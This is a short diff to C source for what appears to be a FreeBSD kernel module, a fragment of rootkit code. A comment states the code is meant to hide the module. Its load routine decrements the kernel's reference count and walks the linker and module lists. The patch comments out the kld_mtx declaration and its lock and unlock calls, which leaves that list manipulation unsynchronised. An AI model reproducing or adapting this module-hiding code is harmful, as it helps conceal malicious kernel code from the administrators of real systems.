@@ -25,7 +25,7 @@
 * to hide this module, which aren't defined in any header files.
 */
 extern linker_file_list_t linker_files;
-extern struct mtx kld_mtx;
+//extern struct mtx kld_mtx;
 extern struct mtx Giant;
 extern int next_file_id;
 typedef TAILQ_HEAD(, module) modulelist_t;
@@ -181,7 +181,7 @@ load(struct module *module, int cmd, void *arg)
 	struct linker_file *lf;
 	struct module *mod;
 	mtx_lock(&Giant);
-	mtx_lock(&kld_mtx);
+	//mtx_lock(&kld_mtx);
 	/* Decrement the current kernel image's reference count. */
 	(&linker_files)->tqh_first->refs--;
 	/*
@@ -195,7 +195,7 @@ load(struct module *module, int cmd, void *arg)
 			break;
 		}
 	}
-	mtx_unlock(&kld_mtx);
+	//mtx_unlock(&kld_mtx);
 	mtx_unlock(&Giant);
 	sx_xlock(&modules_sx);
 	/*
